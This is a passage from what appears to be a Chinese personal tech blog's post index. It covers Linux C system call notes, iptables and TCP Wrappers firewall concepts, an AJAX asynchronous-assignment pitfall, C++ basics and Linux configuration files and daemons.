    <content type="text"><![CDATA[linuxc编程的应用范围比较广，最近学习操作系统，把上机和可编程中用到的一些函数API做一些笔记和摘录，方便日后复习。上机的相关代码在:https://github.com/IversionBY/linux_systemlearning_c_programe/ 温故而知新 关于c语言指针的文章，写得很不错 C语言各个数据类型占用的地址位123456789101112131415char：1字节int：2字节short int：2字节long int：4字节unsigned: 2字节unsigned long：4字节float：4字节double：8字节 函数API basename()实现对文件名的获取 12345 #include &lt;libgen.h&gt; char *basename(char *path);//参数是文件的路径//返回值是一个字符串类型，即文件名 stat() lstat() fstat()返回一个文件的基本信息，包括文件的大小，文件类型等，操作系统上机题目中用到的是目录的判定，最常用的结构体成员是st_mode。与其相类似的是lstat(),fstat()功能和stat()差不多。fstat区别于另外两个系统调用的地方在于，fstat系统调用接受的是一个“文件描述符”（进程通过open系统调用返回的文件描述符，int类型。），而另外两个则直接接受“文件全路径”。stat和lstat的区别：当文件是一个符号链接时，lstat返回的是该符号链接本身的信息；而stat返回的是该链接指向的文件的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;unistd.h&gt;int stat(const char * file_name, struct stat *buf);int fstat(int filedes, struct stat *buf); int lstat(const char *path, struct stat *buf); /*参数解释path：文件路径名。 filedes：文件描述词。 buf：保存文件信息的结构体 *///执行成功则返回0，失败返回-1，错误代码存于errno/*错误代码ENOENT 参数file_name指定的文件不存在ENOTDIR 路径中的目录存在但却非真正的目ELOOP 欲打开的文件有过多符号连接问题，上限为16符号连接 EFAULT 参数buf为无效指针，指向无法存在的内存空间EACCESS 存取文件时被拒绝ENOMEM 核心内存不足ENAMETOOLONG 参数file_name的路径名称太长数值*//*结构体定义struct stat&#123; dev_t st_dev; //device 文件的设备编号 ino_t st_ino; //inode 文件的i-node mode_t st_mode; //protection 文件的类型和存取的权限 nlink_t st_nlink; //number of hard links 连到该文件的硬连接数目, 刚建立的文件值为1. uid_t st_uid; //user ID of owner 文件所有者的用户识别码 gid_t st_gid; //group ID of owner 文件所有者的组识别码 dev_t st_rdev; //device type 若此文件为装置设备文件, 则为其设备编号 off_t st_size; //total size, in bytes 文件大小, 以字节计算 unsigned long st_blksize; //blocksize for filesystem I/O 文件系统的I/O 缓冲区大小. unsigned long st_blocks; //number of blocks allocated 占用文件区块的个数, 每一区块大小为512 个字节. time_t st_atime; //time of lastaccess 文件最近一次被存取或被执行的时间, 一般只有在用mknod、utime、read、write 与tructate 时改变. time_t st_mtime; //time of last modification 文件最后一次被修改的时间, 一般只有在用mknod、utime 和write 时才会改变 time_t st_ctime; //time of last change i-node 最近一次被更改的时间, 此参数会在文件所有者、组、权限被更改时更新&#125;;*//*st_mode的类型标识S_IFMT 0170000 文件类型的位遮罩 S_IFSOCK 0140000 scoket S_IFLNK 0120000 符号连接 S_IFREG 0100000 一般文件 S_IFBLK 0060000 区块装置 S_IFDIR 0040000 目录 S_IFCHR 0020000 字符装置 S_IFIFO 0010000 先进先出 S_ISUID 04000 文件的(set user-id on execution)位 S_ISGID 02000 文件的(set group-id on execution)位 S_ISVTX 01000 文件的sticky位 S_IRUSR(S_IREAD) 00400 文件所有者具可读取权限 S_IWUSR(S_IWRITE)00200 文件所有者具可写入权限 S_IXUSR(S_IEXEC) 00100 文件所有者具可执行权限 S_IRGRP 00040 用户组具可读取权限 S_IWGRP 00020 用户组具可写入权限 S_IXGRP 00010 用户组具可执行权限 S_IROTH 00004 其他用户具可读取权限 S_IWOTH 00002 其他用户具可写入权限 S_IXOTH 00001 其他用户具可执行权限 *//*linux中检查上述st_mode成员类型的宏定义函数S_ISLNK(st_mode) 判断是否为符号连接 S_ISREG(st_mode) 是否为一般文件 S_ISDIR(st_mode) 是否为目录 S_ISCHR(st_mode) 是否为字符三设备文件 S_ISBLK(st_mode) 是否为先进先出 S_ISSOCK(st_mode) 是否为socket S_ISUID(st_mode) 文件设置了SUID位S_ISGID(st_mode) 文件设置了SGID位S_ISVTX(st_mode) 文件设置了sticky位*/ open()打开一个文件，可以指定打开的flag和权限 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;fcntl.h&gt;int open(const char * pathname, int flags, mode_t mode);/*参数解释pathname:需要打开的文件路径flags:打开的标志位mode:打开的权限方式*///返回值：正确返回打开的文件句柄，打开失败返回-1，注意返回的句柄默认从整数3开始。其中标识符`0，1，2`分别被`标准输入`，`标准输出`，`标准错误输出`占用。/*flagsO_RDONLY 以只读方式打开文件O_WRONLY 以只写方式打开文件O_RDWR 以可读写方式打开文件. 上述三种旗标是互斥的, 也就是不可同时使用, 但可与下列的旗标利用OR(|)运算符组合.O_CREAT 若欲打开的文件不存在则自动建立该文件.O_EXCL 如果O_CREAT 也被设置, 此指令会去检查文件是否存在. 文件若不存在则建立该文件, 否则将导致打开文件错误. 此外, 若O_CREAT 与O_EXCL 同时设置, 并且欲打开的文件为符号连接, 则会打开文件失败.O_NOCTTY 如果欲打开的文件为终端机设备时, 则不会将该终端机当成进程控制终端机.O_TRUNC 若文件存在并且以可写的方式打开时, 此旗标会令文件长度清为0, 而原来存于该文件的资料也会消失.O_APPEND 当读写文件时会从文件尾开始移动, 也就是所写入的数据会以附加的方式加入到文件后面.O_NONBLOCK 以不可阻断的方式打开文件, 也就是无论有无数据读取或等待, 都会立即返回进程之中.O_NDELAY 同O_NONBLOCK.O_SYNC 以同步的方式打开文件.O_NOFOLLOW 如果参数pathname 所指的文件为一符号连接, 则会令打开文件失败.O_DIRECTORY 如果参数pathname 所指的文件并非为一目录, 则会令打开文件失败*//*modeS_IRWXU00700 权限, 代表该文件所有者具有可读、可写及可执行的权限.S_IRUSR 或S_IREAD, 00400 权限, 代表该文件所有者具有可读取的权限.S_IWUSR 或S_IWRITE, 00200 权限, 代表该文件所有者具有可写入的权限.S_IXUSR 或S_IEXEC, 00100 权限, 代表该文件所有者具有可执行的权限.S_IRWXG 00070 权限, 代表该文件用户组具有可读、可写及可执行的权限.S_IRGRP 00040 权限, 代表该文件用户组具有可读的权限.S_IWGRP 00020 权限, 代表该文件用户组具有可写入的权限.S_IXGRP 00010 权限, 代表该文件用户组具有可执行的权限.S_IRWXO 00007 权限, 代表其他用户具有可读、可写及可执行的权限.S_IROTH 00004 权限, 代表其他用户具有可读的权限S_IWOTH 00002 权限, 代表其他用户具有可写入的权限.S_IXOTH 00001 权限, 代表其他用户具有可执行的权限.*/ access()检查调用进程是否可以对指定的文件执行某种操作，也可以判断一个文件是否存在。 1234567891011121314151617181920212223242526#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;int access(const char *pathname, int mode);/*参数pathname: 需要测试的文件路径名。 mode: 需要测试的操作模式*///返回：成功执行时，返回0。失败返回-1。/*error 类型成功执行时，返回0。失败返回-1，errno被设为以下的某个值 EINVAL： 模式值无效 EACCES： 文件或路径名中包含的目录不可访问 ELOOP ： 解释路径名过程中存在太多的符号连接 ENAMETOOLONG：路径名太长 ENOENT： 路径名中的目录不存在或是无效的符号连接 ENOTDIR： 路径名中当作目录的组件并非目录 EROFS： 文件系统只读 EFAULT： 路径名指向可访问的空间外 EIO： 输入输出错误 ENOMEM： 不能获取足够的内核内存 ETXTBSY：对程序写入出错*/ close()12345678#include &lt;unistd.h&gt;int close(int fd);/*参数fd:open函数返回的文件描述符*///返回值：若文件顺利关闭则返回0, 发生错误时返回-1.//错误代码：EBADF 参数fd 非有效的文件描述词或该文件已关闭. perror()可以打印出最近一次异常信息，如果提供了指定的字符串，就可以在指定的字符串后面输出异常信息。 12#include &lt;stdio.h&gt;void perror(char *string); read()read函数从指定的打开的文件fd中读取指定大小count的字节到从buf开始的缓冲，缓冲区可以是用户自定义的一个数据形式。 123456789101112131415#include &lt;unistd.h&gt;ssize_t read(int fd, void * buf, size_t count);/*参数说明fd:文件描述符buf:定义的缓冲区count: 需要读取的字节*///返回值:若读取失败则返回-1.读取成功则返回实际读取到的字节数./*错误代码EINTR 此调用被信号所中断.EAGAIN 当使用不可阻断I/O 时(O_NONBLOCK), 若无数据可读取则返回此值.EBADF 参数fd 非有效的文件描述词, 或该文件已关闭.*/ write()把参数buf 所指的内存写入count 个字节到参数fd所指的文件内。当然,文件读写位置也会随之移动。这个函数和上个函数有一点是需要注意的就是缓冲区的大小可能比文件的内容大小要小，这个时候会有一个特征值-1返回给程序员。 123456789#include &lt;unistd.h&gt;ssize_t write (int fd, const void * buf, size_t count);/*参数fd:文件描述符buf:缓冲区count:需要写入的字节数//返回值：成功的话就会返回写入字节大小，数组溢出返回-1. getcwd()获取当前目录名 1234567#include &lt;unistd.h&gt;char * getcwd(char * buf, size_t size);/*参数定义：buf：为一个缓存数组size：为数组的大小*/ getpwuid() 1234#include &lt;pwd.h&gt; #include &lt;sys/types.h&gt;定义函数：struct passwd * getpwuid(uid_t uid); getuid() 用来取得执行目前进程的用户识别码.没有返回值来指示错误。1234#include &lt;unistd.h&gt; #include &lt;sys/types.h&gt;uid_t getuid(void); uname()返回一个关于系统信息的结构体，非负表示调用成功，负数表示返回失败。 1234567891011121314#include&lt;sys/utsname.h&gt;int uname(struct utsname *name );struct utsname&#123; char sysname[]; char nodename[]; char release[]; char version[]; char machine[]; #ifdef _GNU_SOURCE char domainname[]; #endif&#125;; dup()与dup2()复制一个现存的文件描述符。其中标识符0，1，2分别被标准输入，标准输出，标准错误输出占用dup()用来复制参数oldfd 所指的文件描述词, 并将它返回. 此新的文件描述词和参数oldfd 指的是同一个文件, 共享所有的锁定、读写位置和各项权限或旗标. 例如, 当利用lseek()对某个文件描述词作用时, 另一个文件描述词的读写位置也会随着改变。dup2只是多指定了newfd而已，程序员可以直接将oldfd文件符copy到一个自定义的文件符上，若参数newfd为一已打开的文件描述词, 则newfd 所指的文件会先被关闭. dup2()所复制的文件描述词。 12345#include &lt;unistd.h&gt;int dup(int oldfd);//返回值：当复制成功时, 则返回最小及尚未使用的文件描述词. 若有错误则返回-1, errno 会存放错误代码.int dup2(int oldfd, int newfd);//返回值：当复制成功时, 则返回newfd文件描述词. 若有错误则返回-1, errno 会存放错误代码. strtok()用于对字符串进行拆分 1234567891011121314151617181920212223242526272829#include &lt;string.h&gt;char * strtok(char *s, const char *delim);/*例子#include &lt;string.h&gt;#include &lt;stdio.h&gt;int main()&#123; const char str[80] = "This is - www.w3cschool.cc - website"; const char s[2] = "-"; char *token; /* 获取第一个子字符串 */ token = strtok(str, s); /* 继续获取其他的子字符串 */ while( token != NULL ) &#123; printf( " %s\n", token ); token = strtok(NULL, s); &#125; return(0);&#125;*/ setbuf()程序输出有两种方式：一种是即时处理方式，另一种是先暂存起来，然后再大块写入的方式，前者往往造成较高的系统负担。因此，c语言实现通常都允许程序员进行实际的写操作之前控制产生的输出数据量。 12345#include &lt;stdio.h&gt;setbuf(stdout，buf);/*语句将通知输入/输出库，所有写入到stdout的输出都应该使用buf作为输出缓冲区，直到buf缓冲区被填满或者程序员直接调用fflush（译注：对于由写操作打开的文件，调用fflush将导致输出缓冲区的内容被实际地写入该文件），buf缓冲区中的内容才实际写入到stdout中。缓冲区的大小由系统头文件&lt;stdio.h&gt;中的BUFSIZ定义。*/ execve()在父进程中fork一个子进程，在子进程中调用exec函数启动新的程序。exec函数一共有六个，其中execve为内核级系统调用，其他（execl，execle，execlp，execv，execvp）都是调用execve的库函数。 1234567891011#include&lt;unistd.h&gt;int execve(const char *filename, char *const argv[ ], char *const envp[ ]);/*参数filename:需要执行的二进制文件路径argv:二进制执行时的参数设置envp://返回值 函数执行成功时没有返回值，执行失败时的返回值为-1 execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用数组指针来传递给执行文件，并且需要以空指针(NULL)结束，这里应该特别注意，因为在c语言中的字符串默认是\0结尾，所以很多时候是需要编程人员自己去设置结尾符，最后一个参数则为传递给执行文件的新环境变量数组。 waitpid()与wait()wait等待第一个终止的子进程，而waitpid可以通过pid参数指定等待哪一个子进程。当pid=-1、option=0时，waitpid函数等同于wait，可以把wait看作waitpid实现的特例。 123456789101112131415161718192021222324252627#include&lt;sys/types.h&gt;#include&lt;sys/wait.h&gt;pid_t waitpid(pid_t pid, int *status, int options);/*参数int类型的status 是用来保存子进程的返回码pid标识了需要等待的进程option参数可以用来进行一些wait设置*//*常用的option有：1、pid&lt;-1 等待进程组识别码为pid绝对值的任何子进程.2、pid=-1 等待任何子进程, 相当于wait().3、pid=0 等待进程组识别码与目前进程相同的任何子进程.4、pid&gt;0 等待任何子进程识别码为pid 的子进程.参数option 可以为0 或下面的OR 组合：1、WNOHANG：如果没有任何已经结束的子进程则马上返回, 不予以等待；2、WUNTRACED：如果子进程进入暂停执行情况则马上返回, 但结束状态不予以理会. 子进程的结束状态返回后存于status, 底下有几个宏可判别结束情况；3、WIFEXITED(status)：如果子进程正常结束则为非0 值；4、WEXITSTATUS(status)：取得子进程exit()返回的结束代码, 一般会先用WIFEXITED 来判断是否正常结束才能使用此宏；5、WIFSIGNALED(status)：如果子进程是因为信号而结束则此宏值为真；6、WTERMSIG(status)：取得子进程因信号而中止的信号代码, 一般会先用WIFSIGNALED 来判断后才使用此宏；7、WIFSTOPPED(status)：如果子进程处于暂停执行情况则此宏值为真. 一般只有使用WUNTRACED时才会有此情况；8、WSTOPSIG(status)：取得引发子进程暂停的信号代码, 一般会先用；9、WIFSTOPPED 来判断后才使使用此宏。*/ mmset()在一段内存块中填充某个给定的值，它是对较大的结构体或数组进行清零操作的一种最快方法。 123456789#include &lt;string.h&gt;/*in c*/#include &lt;cstring&gt;/*in c++*/ void *memset(void *s, int ch, size_t n);/*参数s :将要被填充任意数据类型指针ch:用来填充的字符，通常是0n:将要填充的字节数*/ bzero()用于将一个字节字符串的前n个字节置零，配合sizeof或者strlen常常用于buf缓冲区的初始化，这个函数的出现可以很大程度的减少c语言里面数组溢出的危险。 12#include &lt;string.h&gt;extern void bzero(void *s, int n);]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>API</tag>
        <tag>C</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux防火墙]]></title>
    <url>%2F2018%2F06%2F23%2Flinux%E9%98%B2%E7%81%AB%E5%A2%99%2F</url>
    <content type="text"><![CDATA[常见的网络服务以及端口表格 服务 默认开放的端口 说明 ftp 21/tcp FTP控制 文件传输协议 ftp 20/tcp FTP数据 Telnet 23 Telnet 不安全的文本传送 ssh 22/tcp SSH 安全登录、文件传送(SCP)和端口重定向 smtp 25/tcp SMTP 简单邮件传输协议(Simple Mail Transfer Protocol)(E-mail) domain 53/tcp 域名服务器 domain 53/udp WWW (HTTP超文本传送协议) http 80/tcp WWW (HTTP超文本传送协议) https 443/tcp HTTPS 经过加密的HTTP(used for securely transferring web pages) ntp 123/udp 网络时间协议 mysql 3306 mysql数据库服务 socks 1080/tcp SOCKS rpc 111 远程调用协议（提供类似于nfs,nis服务器的端口申请和对客户端端口询问执行回复） SMB 139 SMB服务器 更多有关端口与对应的网络服务的信息 防火墙设置三种基础防火墙形式：Netfilter (封包过滤机制)，TCP Wrappers (程序控管)，Proxy (代理服务器) 三种常见的防火墙布线模式：仅一个防火墙部署在路由器内部需要保护的网络再多加一个防火墙隔离态的网络服务器型防火墙部署（DMZ） TCP wrappers 程序管理即以 /etc/host.{allow|deny}的规定来对应用程序的访问ip来源进行规定，但是这样的管理比较粗糙，而iptables针对数据包的字段来进行过滤就实用得多。 受TCP wrappers管理的程序有两个必须的先决条件 super deamon 所管理的服务（也即xinetd） 支持libwrap.io模块的服务iptablesiptables是从以往内核(2.2)中的ipchains发展而来的防火墙机制。 -如何查看哪些程序支持TCP wrappers,可以使用以下方式1234#centos系统chkconfig --list # 查看xinetd 字段下的服务lld $(which $servername)|grep libweap #查看有链接libwrap.io库的服务 iptables/ip6tables的相关概念Linux下的netfilter系列 注意二者的使用规则基本一致Linux下的man在线官网中的iptables介绍Linux下的man在线官网中的ip6tables介绍 iptables 的一些概念：表和链。表：规则链的集合，常用的表有：filter,nat,mangle,自定义的表链：之所以称为链，防火墙的规则是具有顺序的，从上到下，越严格的规则越靠前。 Filter的三条链INPUT:主要与想要进入本机的数据包有关OUTPUT:主要与linux本机要送出的数据包有关FORWARD:与linux本机没有关系，可以传递到内网中（也就是后端机子） NAT常用的三条链 PREROUTING:在进行路由判断之前检查的规则POSTROUTING:在路由判断后检查OUTPUT:与发送出去的数据有关 借用《鸟哥的私房菜服务篇的图来方便理解》 表 链 表的分布逻辑去掉mangle攻击者表后的简化模型 iptables/ip6tables的使用细节和一些大致概念 man在线文档和man的使用已经可以把一些常用的语法给列出个大概，笔者不喜欢做重复的事，所以仅在这里对iptables的大致命令架构以及具体的布局方案在这里做个记录（日后随着自己的见识，实践或者积累来进行） -m 的拓展模块很多，可以大大增强iptables的功能，里面的模块需要积累 -j 的拓展Target参数也是很多的，除了掌握常用的，还有随着经验积累一些特别的 待持续…… nftables新型防火墙以及ufw不复杂防火墙设置，比iptable简单常用的防火墙辅助分析工具 chrootkit:对rootkit后门的自动化检测 swatch等类似的日志分析工具 snort检测机制 arpwatch 基于硬件mac地址的类的检测工具 所谓一个好汉三个帮，在单一的防火墙机制下的系统以及网路防护终归不是个好办法，所以以上的工具在很多的linux发行版中都可以直接通过包管理工具直接进行下载安装，也可以去官网下载源码来make一下，各种工具的合理配置和使用可以和我们的防火墙防护技术相得益彰。]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>安全</tag>
        <tag>运维</tag>
        <tag>防火墙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ajax全局变量赋值的坑]]></title>
    <url>%2F2018%2F05%2F09%2Fajax%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC%E7%9A%84%E5%9D%91%2F</url>
    <content type="text"><![CDATA[Abstact这些天开始慢慢深入接触到一些web前端的知识，当然不只是前端网站的布局设计上面，主要还是在处理一些逻辑上的问题。也就是实验室现在有了个前端脚本混淆的工程，那么写前端代码自然是必不可少的。特别是在前后端数据交互方面的代码编写。这篇文章主要是记录一下对Ajax的全局变量赋值问题的解决。 BackgroundWhatajax是2004年才应用于现在的web前后端数据交互技术，简单的说就是可以在javascript层面实现前后端的交互（虽然这样理解是不确切的，前端js的执行是在浏览器这架构上，所以ajax是一种浏览器和后端服务器交互的技术，只是浏览器的脚本语言为js,所以ajax这中技术就被直观为程序员所理解的浏览器提供的API形式，也就是xmlhttprequest。）它说白了就是一次发包请求（post get）,但是它和以往的请求有点不一样，他可以不请求整个html文件来对页面进行刷新，而是发送一个请求，把请求到的数据按需要内嵌到当前html中。 Why那么，为什么会有这个技术？技术的产生，当然是因为人类的需求。试想每次请求都去刷新整个页面，务必会使web应用不友好（盲目的等待，不必要的整个页面的加载和刷新），同时会加重网络传输的负担。无论在客户端还是服务端都是持有弊端的。所以ajax技术应运而生。它通过异步的可编程的方式来对页面进行刷新，而这个过程通常对使用者是透明的，也就是说用户一般感受不到这次发包的过程。同时实现了按需请求，可以在后端指定发送内容，避免了一大推的垃圾html代码（毫无变化，但是仍旧需要再次传输）。响应速度也会得到很大的提升。 How比较常用的两种形式：原生javasctript,jequry 原生javascript1234567891011121314151617181920212223242526//创建对象xmlhttp = new XMLHttpRequest();//xmlhttp为实例化的XHR对象//更为兼容的方式是定义一个新的函数var xmlhttp;if (window.XMLHttpRequest) &#123;// code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp=new XMLHttpRequest(); &#125;else &#123;// code for IE6, IE5 xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); &#125; /*========================================================================================================================== ============================================================================================================================*/ //调用open,send,等方方法来实现发送一个数据包，注意定义一个状态改变函数，否则这个响应无法实现，就类似一个callback函数一样。xmlhttp.open("POST", "ajax/form_return.php", true);xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");xmlhttp.send("data=" + data);xmlhttp.onreadystatechange = function () &#123; if (xmlhttp.readyState == 4 &amp;&amp; xmlhttp.status == 200) &#123; alert(xmlhttp.responseText); &#125;&#125; 更多细节请查阅相关文档 jequry形式123456789101112//和原生js相比，jequry对js代码进行了简化和重构，如下一个.ajax对象，里面封装了属性和方法。var cdata=30;$.ajax(&#123; url : './ajax/form_return.php', async : true, data: &#123;data:cdata&#125;, success: function(data)&#123; alert(data.responseText);//data为实例化XHR对象 &#125;&#125;); 更多的细节和字段含义可以查阅相关文档 这里补充一下XHR返回对象的主要属性，XHR对象就是XMLHttpRequest对象,它返回主要有以下几个属性：1234responseText: 作为响应主体被返回的文本(文本形式)responseXML: 如果响应的内容类型是&apos;text/xml&apos;或&apos;application/xml&apos;，这个属性中将保存着响应数据的XML DOM文档(document形式)status: HTTP状态码(数字形式)statusText: HTTP状态说明(文本形式) Problem现在到了写这篇文章的正真意义所在了。由于ajax是支持异步模式的，考虑一种情况，在支持异步的模式下，如何通过一个状态转移函数给一个全局的变量赋值？ 相信写过ajax异步请求，并且需要如此操作的程序员都会面临这个在其他语言中就是个函数直接对全局变量进行修改的小问题，在这加入了一步的ajax请求有时会变得充满了玄学（其实是笔者初涉ajax,才把之说为玄学，还请正真理解了ajax原理的师傅莫要嘲笑）。 问题代码如下： 原生javascript 前端：12345678910111213&lt;script&gt;var date=30; var result;xmlhttp.open("POST", "ajax/form_return.php", true);xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");xmlhttp.send("data=" + data);xmlhttp.onreadystatechange = function () &#123; if (xmlhttp.readyState == 4 &amp;&amp; xmlhttp.status == 200) &#123; result=xmlhttp.responseText; &#125;&#125;alert(result);&lt;script&gt; 后端：123456789&lt;?phperror_reporting(0);$Getdata=$_POST["data"];$response="hello world";#$Getdata=30;if($Getdata==30)&#123; echo $response;&#125;?&gt; 按我们的理解这里明明应该弹出一个消息框，上面为服务端返回的值hello world,然而实际上是undefined,exuse me? jequry1234567891011var cdata=30;var result;$.ajax(&#123; url : './ajax/form_return.php', async : true, data: &#123;data:cdata&#125;, success: function(data)&#123; result=data.responseText; &#125;&#125;);alert(result); 在这里result同样是undefined，excuse me? Solve经过一番苦苦寻觅后，现在总结一下可以尝试对全局变量进行赋值的两种思想。 使用html5的新特性，利用浏览器Web Storage，将函数中接收到的值保存到浏览器的sessionStorage或localStorage（两者都可以用来保存一些数据，前者只是对当前页面，会话有效，后者保存在本地，可以页面之间共用） 在jequry中把异步模式设置成true,然后把success方法设置成compete（这个设置同步模式的方法在原生js里面缺少类似complete的方法，所以只对jequry还有效） 在子线程中设置同步请求模式，因为之前说过主线程的同步设置是被浏览器所不推荐的。]]></content>
      <categories>
        <category>浏览器安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[cpp]]></title>
    <url>%2F2018%2F03%2F09%2Fcpp%2F</url>
    <content type="text"><![CDATA[主要学习在基本语法上面c++ 与c的差别，当然最主要的面向对象部分就不列出，打算将python,php，c++ 的面向对象做一个对比。 函数的重载将函数返回类型相同，函数功能相同的，但是参数的数据类型以及容忍参数个数不同的函数命名为相同的函数名的现象，就叫做函数重载。1234567891011121314151617#include&lt;iostream&gt;using namespace std;void main()&#123; &#125;int max(int num1,int num2)&#123; return (num1&gt;=num2)?num1:num2;&#125;int max(float num1,float num2)&#123; return (num1&gt;=num2)?num1:num2;&#125;int max(int num1,int num2,int num3)&#123; return (max(num1,num2)&gt;num3)?max(num1,max2):num3&#125; 为了实现更为高级的代码重用，c++里面还提供了函数模板的功能。 1234567#格式：template&lt;&lt;class&gt;/&lt;typename&gt; T1(T2，T3,......)&gt;T1 max(T1 nunm1,T1 num2)&#123; T1 themax; themax=(num1&gt;=num2)?num1:num2; return themax;&#125; 命名空间命名空间是为了避免在不同的文件应用过程中出现函数，对象，变量命名重复的情况，所以指定了命名空间。相同命名空间不能出现重名，不同的命名空间可以。命名空间的两种形式以及命名空间类的指定方式。12345命名空间::成员名称在这中命名形式下的的对象以及常量的引用需要有&quot;::&quot;using namespace &lt;命名空间&gt;这种引用形式下可以直接对类和常量实现引用 内联函数内联函数是为了让功能相对简单的函数避免调用栈以及相关的操作来加速程序，提高运行效率的做法。特别注意的是：这里的内联函数需要函数相对简单，也就是直观的来看就是代码行数小。1234inline 返回的值类型 函数名(形参列表)&#123; 函数体; &#125; new,delete实现动态创建数组123456789#include&lt;iostream&gt;using namespace std;void main()&#123; int length,i,*ptr1; cout &lt;&lt;&quot;请输入数组的长度&quot;; cin &gt;&gt; lenth; ptr1=new int[length];//这是c++特有的，C语言里面是会报错的 delete[] ptr1;//注意变量结束记得销毁，不然会导致内存无法再次使用&#125; malloc free 与new delete的比较 枚举数据类型123enum 枚举数据类型名 &#123;变量值列表标识符&#125;#其值一次对应的是0，1，2，3......枚举变量类型名 标识符 C++引入的4种强制类型转换符1.static_cast2.const_cast3.dynamic_cast4.reinterpret_cast 输入输出函数在C++中的函数输入输出和之前的C有了很大的不同，它采用的是一种很明显的数据流操作方式，就好比linux中流的重定向&lt;&lt;,&gt;&gt;。相对应的函数为cout,cin,同时也没有了c中的强制类型声明，相对比较灵活。]]></content>
      <categories>
        <category>cpp</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[linux修炼]]></title>
    <url>%2F2018%2F03%2F07%2Flinux%E4%BF%AE%E7%82%BC%2F</url>
    <content type="text"><![CDATA[网络配置文件123456789101112131415161718192021222324252627282930#ip ,netmast,dhcp,gateway/etc/sysconfig/network-scripts/ifcfg-&lt;interface-name&gt;#ifup,ifdown系列自动启动/关闭网络接口脚本/etc/syysconfig/network-scripts/ifdown-xxx or ifup-xxx#主机网络基本配置/etc/sysconfig/network#DNS IP/etc/resolv.conf#私有ip对应的主机名,实现本机静态查询/etc/hosts#针对ubuntu的独有的网络配置文件/etc/network/interfaces#用于重新启动服务的目录/etc/init.d/network #或者使用内置脚本ifup &lt;interface&gt; ifdown &lt;interface&gt;#几个固定协议文件，一般不需要修改#网络协议定义文件，包括默认端口的信息/etc/services#网络数据包默认协议/etc/protocols 进程配置文件123456789101112131415161718#服务启动脚本/etc/init.d/&lt;deamon&gt;#服务初始化配置/etc/sysconfig/*#superdeamon 配置文件/etc/xinetd.config #大体配置/etc/xinetd.d/* #具体到superdeamon 管辖下的每个服务的具体配置#服务本身的配置文件/etc/&lt;deamon&gt;#服务数据存放/var/lib/*#服务的pid记录处/var/run/* linux重要守护进程 acpi-support 高级电源管理支持 acpid acpi 守护程序.这两个用于电源管理，非常重要 apmd acpi 的扩展 alsa 声音子系统 alsa-utils 声音子系统实用工具 cron 任务调度系统，建议开启 anacron cron 的子系统，将系统关闭期间的计划任务，在下一次系统运行时执行 atd 类似于 cron 的任务调度系统。建议关闭 binfmt-support 核心支持其他二进制的文件格式 bluez-utiles 蓝牙设备支持 bootlogd 启动日志。开启它 syslog-ng 系统日志，建议开启 klogd 同上，使用一种就可以了 cupsys 打印机子系统 dbus 消息总线系统(message bus system)。非常重要 dns-clean 使用拨号连接时，清除 dns信息 evms 企业卷管理系统 fetchmail 邮件用户代理守护进程，用于收取邮件 gdm gnome 登录管理器 gpm 终端中的鼠标支持 halt 关闭系统 hdparm 调整硬盘的脚本，配置文件为&nbsp;/etc/hdparm.conf hibernate 系统休眠 hotplug and hotplug-net 即插即用支持，比较复杂，建议不要动它 ifrename 网络接口重命名脚本。如果您有十块网卡，您应该开启它 inetd 配置文件为&nbsp;/etc/inetd.conf linux-restricted-modules-common 受限模块支持。 lvm 逻辑卷管理系统支持 makedev 创建设备文件，非常重要 mdamd 磁盘阵列 module-init-tools 从/etc/modules加载扩展模块，建议开启 networking 网络支持。按&nbsp;/etc/network/interfaces&nbsp;文件预设激活网络，非常重要 ntpdate 时间同步服务，建议关闭 pcmcia pcmcia 设备支持 powernowd 移动 CPU 节能支持 ppp 拨号连接 readahead 预加载库文件 reboot 别动它 resolvconf 自动配置 DNS rmnologin 清除 nologin rsync rsync 守护程序 sendsigs 在重启和关机期间发送信号 single 激活单用户模式 sshd ssh服务器 sudo 检查 sudo 状态 udev 用户空间 dev文件系统（userspace dev filesystem）。重要 umountfs 卸载文件系统 urandom 随机数生成器 usplash 开机画面支持 vbesave 显卡 BIOS 配置工具。保存显卡的状态 xorg-common 设置 X 服务 ICE socket adjtimex 调整核心时钟的工具 dirmngr 证书列表管理工具 hwtools irqs 优化工具 libpam-devperm 系统崩溃之后，用于修理设备文件许可的守护程序 lm-sensors 板载传感器支持 mdadm-raid 磁盘陈列管理器 screen-cleanup 清除开机屏幕的脚本 xinetd 新一代的网络守护进程服务程序（extended internet daemon） super deamon 具体配置文件（/etc/xinetd.d/*）里面的参数选项 文件格式：123456789101112service &lt;service_name&gt;&#123; &lt;attribute&gt; &lt;option&gt; &lt;value&gt; &lt;value&gt; ......&#125;#-------------------------------------------------------#其中option 有以下几种:=: +=:-=:` attribute (功能)说明与范例 一般配置项目：服务的识别、启动与程序 disable(启动与否) 配置值：[yes|no]，默认 disable = yes disable 为取消的意思，此值可配置该服务是否要启动。默认所有的 super daemon 管理的服务都不启动的。 若要启动就得要配置为『 disable = no 』 id(服务识别) 配置值：[服务的名称] 虽然服务在配置文件开头『 service 服务名称』已经指定了，不过有时后会有重复的配置值，此时可以用 id 来取代服务名称。 你可以参考一下 /etc/xinetd.d/time-stream 来思考一下原理。 server(程序文件名) 配置值：[program 的完整檔名] 这个就是指出这个服务的启动程序！例如 /usr/bin/rsync 为启动 rsync 服务的命令，所以这个配置值就会成为： 『 server = /usr/bin/rsync 』 server_args(程序参数) 配置值：[程序相关的参数] 这里应该输入的就是你的 server 那里需要输入的一些参数啦！例如 rsync 需要加入 --daemon ， 